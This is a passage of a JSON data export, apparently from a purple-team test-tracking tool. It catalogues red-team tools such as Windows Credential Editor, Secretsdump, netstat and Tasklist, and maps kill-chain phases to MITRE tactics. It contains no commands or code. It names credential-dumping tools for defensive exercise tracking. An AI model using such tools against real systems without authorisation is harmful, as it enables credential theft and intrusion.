791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"bbf62501-def0-4196-a9b1-939663513a3a","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--c8e8396d-7c77-4119-bd6d-5d88419032ea","vectrId":"c8e8396d-7c77-4119-bd6d-5d88419032ea","offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"name":"netstat","version":"n/a","description":"[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--d45db0db-f253-4b70-80e1-c12c07bf8313","vectrId":"d45db0db-f253-4b70-80e1-c12c07bf8313","offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"name":"Windows Credential Editor","version":"n/a","description":"[Windows Credential Editor](https://attack.mitre.org/software/S0005) is a password dumping tool. (Citation: Amplia WCE)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--e6217a43-ebc1-40ec-8ce0-245fcb8b7269","vectrId":"e6217a43-ebc1-40ec-8ce0-245fcb8b7269","offset":0,"createTime":1.578425907137E12,"updateTime":1.578425907137E12,"name":"Secretsdump","version":"1","description":"Secretsdump","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","5f453ab7-7447-4d48-85bb-c092111b10a5","ecef1af6-4ab3-4501-a94c-9d72bd72f124","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":[],"primarySecondary":"Primary","vendorId":"c22bf791-e645-4cb6-a193-adfce311213e","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-redproduct","id":"x-vectr-io-redproduct--f7ed4709-5abb-418a-b84b-8b947b41a96c","vectrId":"f7ed4709-5abb-418a-b84b-8b947b41a96c","offset":0,"createTime":1.569010318167E12,"updateTime":1.569010318167E12,"name":"Tasklist","version":"n/a","description":"The [Tasklist](https://attack.mitre.org/software/S0057) utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface. (Citation: Microsoft Tasklist)","applicablePhaseIds":["24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","1b7512d2-ec31-4fab-af57-4fec213b0ae8","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","ecef1af6-4ab3-4501-a94c-9d72bd72f124","5f453ab7-7447-4d48-85bb-c092111b10a5","866d6b69-3f03-4c88-bf51-679a0e4cab74","f9271ade-7cab-4cba-9a3e-6f722482bb80","7ff406ce-85e1-4732-ae3d-8ec478023d6f","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","0d594ca4-4491-4b70-9227-c9e0589dfcca","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","47da3f56-d9fc-4735-a343-b57b4ad8eca5","01d77cc8-b129-413b-adf5-850cebc4ae79","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","769c1759-3db5-486d-918a-67fbadee4787","2afb7c56-ea1b-47fc-b96c-1579dd049690","69a00d73-ea90-401c-8ef0-9fcd1785d0b4"],"expectedDetectionLayerIds":["4a35ec87-16cf-4c46-b083-f25df01e02f9","a95575f5-124e-4bf4-8fe3-c19fc3506b8f","3e014b51-0a62-44ad-86a7-9f27a3128196","45719f74-ccb0-41a4-8fdf-fef547c3ce3d","765c22af-e010-4b4d-9ba5-86e1ae6c916d","35edd968-3417-4bb0-a3a8-43a3e710b4fa","9309d503-0861-4923-8a9a-f4749113e9e7","d34d1ad7-8ca5-41e0-bbfa-7a2b420f0d59","a0e7b7dc-aba2-4027-9357-89caed086b5d","ca2faec1-7837-45ec-b6bb-64e1705a0014","4fc1d7cf-5d2e-4446-8eef-6ed36df986d5","187fbad5-3728-42bd-bedc-42098c7eb167","6d4984f9-9d79-4f21-a495-dd6fcd0ee363","d2d7d787-e8ce-47a5-8b96-14fb6d72cfe5","0eaac669-7d11-4397-8011-a9cce6e577be","9d2569b3-ad9e-4496-a81a-47a0e8ef57b3","61d3f883-72cd-4c57-8d84-545a5f34ac5c","860cc9bc-4da2-4698-889b-e96cca9e4bf3","c6b0def0-a115-4677-85fa-a7f08359a5e2","d37784d0-0083-45b7-b332-d5eb9ee95ca6","54c70ef6-1e4a-4613-a99d-692230cb557a","6490f8d2-6bc1-4721-86c3-6244ac9f622e","2ff8b970-9742-4e81-9dd1-abe28518bb0b","9b70bae4-10c6-46fe-ad6f-e33bc0e6758f","512f7c46-b791-49bc-8afb-73d172bcc120","8cf5dd9d-1745-4f3c-861b-8548abf4080c","9e008dd9-fe16-4ac8-8a6f-e537f60238f1","0689aff6-d98e-4776-b36b-056f1a7645b2"],"primarySecondary":"Primary","vendorId":"058e6f79-4b72-4905-83d0-ac55f5889fc6","analysisEngine":false,"color":"#9E9E9E","tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-killchain","id":"x-vectr-io-killchain--5cd6bf81-e3f2-4430-ba0c-5288328a20c5","vectrId":"5cd6bf81-e3f2-4430-ba0c-5288328a20c5","createTime":1.500908684689E12,"updateTime":1.556021441393E12,"offset":0,"name":"Default","description":"Combination of commonly used traditional kill chain phases in addition to all MITRE Tactics. (16 total phases or tactics to map test cases to)","phases":["01d77cc8-b129-413b-adf5-850cebc4ae79","0d594ca4-4491-4b70-9227-c9e0589dfcca","1b7512d2-ec31-4fab-af57-4fec213b0ae8","24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","47da3f56-d9fc-4735-a343-b57b4ad8eca5","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","5f453ab7-7447-4d48-85bb-c092111b10a5","69a00d73-ea90-401c-8ef0-9fcd1785d0b4","769c1759-3db5-486d-918a-67fbadee4787","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","866d6b69-3f03-4c88-bf51-679a0e4cab74","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79"],"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-killchain","id":"x-vectr-io-killchain--cac4fa1b-7183-4597-9cab-ed692c8e960f","vectrId":"cac4fa1b-7183-4597-9cab-ed692c8e960f","createTime":1.516751097007E12,"updateTime":1.556021441393E12,"offset":0,"name":"MITRE Enterprise Tactics","description":"Standard alignment to MITRE Enterprise Tactics. (All 12 Tactics available for to map test cases to)","phases":["01d77cc8-b129-413b-adf5-850cebc4ae79","24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","47da3f56-d9fc-4735-a343-b57b4ad8eca5","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","5f453ab7-7447-4d48-85bb-c092111b10a5","69a00d73-ea90-401c-8ef0-9fcd1785d0b4","769c1759-3db5-486d-918a-67fbadee4787","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","866d6b69-3f03-4c88-bf51-679a0e4cab74","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79"],"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-killchain","id":"x-vectr-io-killchain--ea965f5a-2a80-4a94-968e-740e70a80c90","vectrId":"ea965f5a-2a80-4a94-968e-740e70a80c90","createTime":1.556021441393E12,"updateTime":1.556021441393E12,"offset":0,"name":"Unified Kill Chain","description":"Includes full unified kill chain with traditional kill chain phases in addition to all MITRE tactics.  The unified kill chain is similar to the \"default\" profile above but also enables \"Weaponization\", \"Target Manipulation\", \"Pivoting\", and \"Social Engineering\". (Includes 20 total phases/tactics to map test cases to)","phases":["01d77cc8-b129-413b-adf5-850cebc4ae79","0d594ca4-4491-4b70-9227-c9e0589dfcca","1b7512d2-ec31-4fab-af57-4fec213b0ae8","24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","2afb7c56-ea1b-47fc-b96c-1579dd049690","47da3f56-d9fc-4735-a343-b57b4ad8eca5","48dc2baf-1d23-46cb-bb6f-ef36bc0db493","549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","5f453ab7-7447-4d48-85bb-c092111b10a5","69a00d73-ea90-401c-8ef0-9fcd1785d0b4","769c1759-3db5-486d-918a-67fbadee4787","772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","7ff406ce-85e1-4732-ae3d-8ec478023d6f","866d6b69-3f03-4c88-bf51-679a0e4cab74","ac8d65ca-f067-4213-9383-ac34dc8f236c","b01606fb-b984-4415-ac33-456e12fecea9","bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","cc4c7093-0b33-4cf6-95a7-eff607c86c79","ecef1af6-4ab3-4501-a94c-9d72bd72f124","f9271ade-7cab-4cba-9a3e-6f722482bb80"],"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--01d77cc8-b129-413b-adf5-850cebc4ae79","vectrId":"01d77cc8-b129-413b-adf5-850cebc4ae79","createTime":1.54775805387E12,"updateTime":1.54775805387E12,"offset":0,"name":"Credential Access","description":"Techniques resulting in the access of, or control over, system, service or domain credentials","abbreviation":"CRED-ACC","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["CREDENTIAL_ACCESS"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--0d594ca4-4491-4b70-9227-c9e0589dfcca","vectrId":"0d594ca4-4491-4b70-9227-c9e0589dfcca","createTime":1.547758053872E12,"updateTime":1.547758053872E12,"offset":0,"name":"Action on Objectives","description":"Steps involving final acquisition of the adversary's objectives, including extraction of sensitive data and compromise of sensitive business applications, or initiation of sensitive financial transactions","abbreviation":"ACT","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--1b7512d2-ec31-4fab-af57-4fec213b0ae8","vectrId":"1b7512d2-ec31-4fab-af57-4fec213b0ae8","createTime":1.547758053868E12,"updateTime":1.547758053868E12,"offset":0,"name":"Exploitation","description":"Techniques to exploit vulnerabilities in systems that may, amongst others, result in code execution","abbreviation":"EXPLOIT","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","vectrId":"24291ae1-2110-4f4c-8b0d-7b8c8676ed5d","createTime":1.547758053871E12,"updateTime":1.547758053871E12,"offset":0,"name":"Collection","description":"Techniques used to identify and gather information from a target network prior to exfiltration","abbreviation":"COLL","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["COLLECTION"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--2afb7c56-ea1b-47fc-b96c-1579dd049690","vectrId":"2afb7c56-ea1b-47fc-b96c-1579dd049690","createTime":1.547758053866E12,"updateTime":1.547758053866E12,"offset":0,"name":"Weaponization","description":"Coupling a remote access trojan with an exploit into a deliverable payload","abbreviation":"WEAPON","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--47da3f56-d9fc-4735-a343-b57b4ad8eca5","vectrId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","createTime":1.547758053868E12,"updateTime":1.547758053868E12,"offset":0,"name":"Persistence","description":"Any access, action or change to a system that gives an attacker persistent presence on the system","abbreviation":"PERSIST","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["PERSISTENCE"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--48dc2baf-1d23-46cb-bb6f-ef36bc0db493","vectrId":"48dc2baf-1d23-46cb-bb6f-ef36bc0db493","createTime":1.547758053869E12,"updateTime":1.547758053869E12,"offset":0,"name":"Privilege Escalation","description":"The result of techniques that provide an attacker with higher permissions on a system or network","abbreviation":"PRIV-ESC","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["PRIVILEGE_ESCALATION"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","vectrId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","createTime":1.547758053869E12,"updateTime":1.547758053869E12,"offset":0,"name":"Discovery","description":"Techniques that allow an attacker to gain knowledge about a system and its internal network","abbreviation":"DISC","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["DISCOVERY"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--5f453ab7-7447-4d48-85bb-c092111b10a5","vectrId":"5f453ab7-7447-4d48-85bb-c092111b10a5","createTime":1.567713011318E12,"updateTime":1.567713011318E12,"offset":0,"name":"Impact","description":"Covers integrity and availability attacks against enterprise systems. Each technique will include an Impact Type label of 'Integrity' or 'Availability'.","abbreviation":"IMPACT","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["IMPACT"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--69a00d73-ea90-401c-8ef0-9fcd1785d0b4","vectrId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","createTime":1.547758053868E12,"updateTime":1.547758053868E12,"offset":0,"name":"Command & Control","description":"Techniques that allow attackers to communicate with controlled systems within a target network","abbreviation":"C2","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["COMMAND_AND_CONTROL"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--769c1759-3db5-486d-918a-67fbadee4787","vectrId":"769c1759-3db5-486d-918a-67fbadee4787","createTime":1.547758053867E12,"updateTime":1.547758053867E12,"offset":0,"name":"Initial Access","description":"Techniques used for initial target compromise","abbreviation":"ACCESS","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["INITIAL_ACCESS"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","vectrId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","createTime":1.54775805387E12,"updateTime":1.54775805387E12,"offset":0,"name":"Execution","description":"Techniques that result in execution of attacker-controlled code on a local or remote system","abbreviation":"EXE","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["EXECUTION"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--7ff406ce-85e1-4732-ae3d-8ec478023d6f","vectrId":"7ff406ce-85e1-4732-ae3d-8ec478023d6f","createTime":1.547758053871E12,"updateTime":1.547758053871E12,"offset":0,"name":"Target Manipulation","description":"Techniques aimed at manipulation of the target system to achieve the objective of the attack","abbreviation":"TGT-MAN","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--866d6b69-3f03-4c88-bf51-679a0e4cab74","vectrId":"866d6b69-3f03-4c88-bf51-679a0e4cab74","createTime":1.54775805387E12,"updateTime":1.54775805387E12,"offset":0,"name":"Lateral Movement","description":"Techniques that enable an adversary to access and control remote systems on a network","abbreviation":"LAT-MOV","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["LATERAL_MOVEMENT"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--ac8d65ca-f067-4213-9383-ac34dc8f236c","vectrId":"ac8d65ca-f067-4213-9383-ac34dc8f236c","createTime":1.547758053866E12,"updateTime":1.547758053866E12,"offset":0,"name":"Reconnaissance","description":"Researching, identifying and selecting targets using active or passive reconnaissance","abbreviation":"RECON","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["DISCOVERY"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--b01606fb-b984-4415-ac33-456e12fecea9","vectrId":"b01606fb-b984-4415-ac33-456e12fecea9","createTime":1.547758053866E12,"updateTime":1.547758053866E12,"offset":0,"name":"Delivery","description":"Techniques resulting in the transmission of the payload to the targeted environment","abbreviation":"DELIV","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["INITIAL_ACCESS"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","vectrId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","createTime":1.547758053871E12,"updateTime":1.547758053871E12,"offset":0,"name":"Exfiltration","description":"Techniques that result or aid in an attacker removing files and information from a target network","abbreviation":"EXFIL","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["EXFILTRATION"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--cc4c7093-0b33-4cf6-95a7-eff607c86c79","vectrId":"cc4c7093-0b33-4cf6-95a7-eff607c86c79","createTime":1.547758053868E12,"updateTime":1.547758053868E12,"offset":0,"name":"Defense Evasion","description":"Techniques an attacker may use for the purpose of evading detection or avoiding other defenses","abbreviation":"EVAS","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["DEFENSE_EVASION"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--ecef1af6-4ab3-4501-a94c-9d72bd72f124","vectrId":"ecef1af6-4ab3-4501-a94c-9d72bd72f124","createTime":1.547758053869E12,"updateTime":1.547758053869E12,"offset":0,"name":"Pivoting","description":"Tunnelling traffic through a controlled system to other systems that are not directly accessible","abbreviation":"PIV","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":["LATERAL_MOVEMENT"],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-phase","id":"x-vectr-io-phase--f9271ade-7cab-4cba-9a3e-6f722482bb80","vectrId":"f9271ade-7cab-4cba-9a3e-6f722482bb80","createTime":1.547758053867E12,"updateTime":1.547758053867E12,"offset":0,"name":"Social Engineering","description":"Techniques involving human interaction with targets, ranging from spear phishing, phone calls, information gathering and reconnaissance on personnel and physical security, and other possible techniques","abbreviation":"SOCIAL","active":true,"deprecated":false,"deprecationTime":0.0,"tagIds":[],"system":true,"mitreTactics":[],"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-expecteddetectionlayer","id":"x-vectr-io-expecteddetectionlayer--0689aff6-d98e-4776-b36b-056f1a7645b2","vectrId":"0689aff6-d98e-4776-b36b-056f1a7645b2","createTime":1.480624083E12,"updateTime":1.548368641644E12,"offset":0,"name":"Web Gateway","description":"Includes traditional corporate web proxy, tools that analyze web traffic for indicators, or may be fully covered with layer 7 inspection from modern firewall 